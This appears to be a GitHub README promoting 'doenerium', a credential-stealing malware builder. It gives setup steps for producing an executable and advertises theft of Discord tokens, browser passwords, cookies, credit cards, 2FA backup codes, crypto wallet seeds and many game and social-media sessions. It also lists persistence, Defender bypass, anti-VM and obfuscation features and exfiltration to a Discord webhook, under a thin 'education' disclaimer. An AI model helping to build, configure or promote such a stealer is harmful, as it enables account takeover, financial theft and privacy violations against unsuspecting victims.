<a id="top"></a>
<h1 align="center">
⚔️ NEW UPDATE NEW FEATURES AT 250 STARS ⭐
</h1>

<p align="center"> 
  <kbd>
<img src="https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp" width="328"></img>
  </kbd>
</p>

<p align="center">
<img src="https://img.shields.io/github/last-commit/doenerium6969/doenerium-fixed?style=flat">
<img src="https://img.shields.io/github/stars/doenerium69/doenerium?color=brightgreen">
<img src="https://img.shields.io/github/forks/doenerium69/doenerium?color=brightgreen">
</p>

<h1 align="center">
  Telegram Community: https://t.me/doenerium69
  <br>
  <br>
</h1>


## 🌐 〢 Content

- [📁 Setting up](#setup)
- [⚔️ Features](#features)
- [📸 Screenshots](#screenshot)
- [📝 Todo](#todo)
- [📜 License](#license)
- [⚠️ Note](#note)

<a id="setup"></a>

---

### 📁  〢 Setting Up
>
> [![Watch the video](https://cdn.discordapp.com/attachments/1206389634926383234/1286525981061808148/image_3.png?ex=66f4d1b0&is=66f38030&hm=21e431250c42681500caf1d608d45b945087815f5d83a66dea8f8c266a3f9247&)](https://streamable.com/veupi7)
>
>
> Install [Node.js](https://nodejs.org/en/download/prebuilt-installer/current) `IMPORTANT: Install NodeJS with Tools for Native Modules`
> 
> ***VERY IMPORTANT***: When installing Node.js also install **"Tools for Native Modules"** => Tick `Automatically install the neccessary tools. Note that this will also install Chocolatey. The script will pop-up in a new window after the installation completes.`
>
> First run the `install.bat` file to install all necessary packages and `start.bat`.
>
> After the build, click `Ressources` to choose an icon for your executable. 
> ``The filetype must be ".ico" and the icon should be 16x16px, 32x32px, 64x64px, 128x128px, 256x256px`` 
>

<a id="features"></a>


---

### ⚔️ 〢 Features

#### Stealer

> No Dependent Clipper (exe does not need to stay running for the clipper to work)
>
> Wallet Injection 12words + passwords [ Exodus, Atomic ]
> 
> Percistance Hidden Startup + if reg get deleted = auto come back :)
>
> Files Stealer [.txt, .doc, .docx, .rdp, .pdf and more]
>
> Binder, will add exclusion to your file to bypass defender.
> 
> Discord Token, Friends with rare badges, Credit card
>
> Discord Info - Username, Phone number, Email, Billing, Nitro Status & Backup Codes
>
> Discord About Me changer, HQ Guilds Admin/Owner
>
> Steal Backup 2FA Code [ Discord, Epic Games, Github ]
>
> Grabs crypto wallets -
> 💸 Zcash
> 🚀 Armory
> 📀 Bytecoin
> 💵 Jaxx
> 💎 Exodus
> 📉 Ethereum
> 🔨 Electrum
> 🕹️ AtomicWallet
> 💹 Guarda
> ⚡ Coinomi
> 🦊 MetaMask
>
> Browser (Chrome, Opera, Firefox, OperaGX, Edge, Brave, Yandex) -
> Passwords, Cookies, Autofill & History (Searches for specific keywords such as PayPal, Coinbase etc. in them)
>
> Screenshots all screen
>
> Telegram Session stealer
>
> Riot Games Session stealer
> 
> FTP stealer (FileZilla)
>
> VPN Stealer
>
> Growtopia Stealer
>
> Minecraft Session stealer & validator
> 
> Instagram Session stealer & validator
> 
> Roblox Session stealer & validator
>
> Steam Session stealer & validator
>
> TikTok Session stealer & validator
>
> Twitter Session stealer & validator
>
> Reddit Session stealer & validator
>
> Epic Games Launcher Session stealer



### 🏹 〢 Additional

> Internet connection check every 3 seconds before it starts stealing
>
> Ultra Obfuscation (use https://obfuscator.io)
>
> Disable UAC / Anti-Debug / Anti-VM / Blue Screen if detect
>
> No Traces and silent
>
> Validates a found discord token and then sends it to your discord webhook
>
> Sends all files to your discord webhook in beautiful embeds and a structured zip file
>
> Automatic obfuscation when building (12 sec to build exe | 30-40mb)

<a id="screenshot"></a>

---

### 📸 〢 Screenshots
<img title="" src="https://cdn.discordapp.com/attachments/1199547023398010950/1286508649233256529/image.png?ex=66ee2a0c&is=66ecd88c&hm=f45c7c515c672b6010206e37d387b90f916afb5748d178b812a34459a29f729a&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/1223099035162771528/1283270003491213394/Sans_titre.png?ex=66e261d2&is=66e11052&hm=e8f1d2997fc5e829131f876d9841f0f258c4fb9d4b1a69650978f4ae7f3c4feb&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/1206389634926383234/1230294887778357300/image.png?ex=66db8c67&is=66da3ae7&hm=6facdb3d3b1d4bbb59e584dc7bf8b74ebd099b19e2310943b8bc4ce44d80e923&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/1206389634926383234/1230249925086937218/image.png?ex=66edd787&is=66ec8607&hm=9f67e3be278a898d3faed346f3a515865901943e8d41ab2e8efc84784a53d596&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218385119677513898/Screenshot_12.png?ex=66ed8651&is=66ec34d1&hm=416142e9d09730dee090fb83ca472897b1509358f8863047c87228d371e154fd&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/994591063253733407/1219372808333693058/Screenshot_1.png?ex=66db5d6c&is=66da0bec&hm=ee06ab95d2cbce810253f8cfb10562f19b2445756eb485ec59321a355de24519&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218381908203929773/Screenshot_3.png?ex=66ed8353&is=66ec31d3&hm=7913d0530fafd147fee17496e7e556c8eaebe6e0635009643b876186c12a148e&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218381997198672003/Screenshot_7.png?ex=66ed8368&is=66ec31e8&hm=07778b46b51da5e985eb7e3428e736e31dafad1ab94c8a6124ea7a72adf7d008&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218381947546501191/Screenshot_11.png?ex=66ed835c&is=66ec31dc&hm=4e16b1fb27045dbb5b16a49625d3932cd6c0e23d942b24d00c0005f5bde31776&" alt="" width="820">
<img title="" src="https://media.discordapp.net/attachments/994591063253733407/1218385666837319803/Screenshot_13.png?ex=66ed86d3&is=66ec3553&hm=a38a163abd19d4bf1ddd2d004c1617025415b1a9ee571a408adf11884625486d&" alt="" width="820">
<img title="" src="https://cdn.discordapp.com/attachments/660885288079589385/1206900306638540830/Screenshot_6.png?ex=66edee40&is=66ec9cc0&hm=de8fe329953fffa925397ca75f68a2636dce3e39d1faba0e970b61de4657c034&" alt="" width="820">



<a id="todo"></a>

---

### 📝 〢 Todo

> - ~~Exodus wallet injection (get the password whenever the user logs in the wallet)~~
> - More grabbers (VPN's, Gaming, Messengers)
> - Keylogger/<strike>Clipper</strike>
> - Telegram bot to build within Telegram
> - <strike>Stable Version recive log by Telegram</strike>
> - Firefox stealer
>   
> - [Click here](https://t.me/doenerium69/4044/4045) to request new features that you would like to see in the next version of our software ?
<a id="license"></a>

---

### 📜 〢 License

By downloading this, you agree to the Commons Clause license and that you're not allowed to sell this repository or any code from this repository. For more info see [commonsclause](https://commonsclause.com/)

<a id="note"></a>

---

### ⚠️ 〢 Note

I am not responsible for any damages this software may cause after being acquired. This software was made for personal education and sandbox testing.
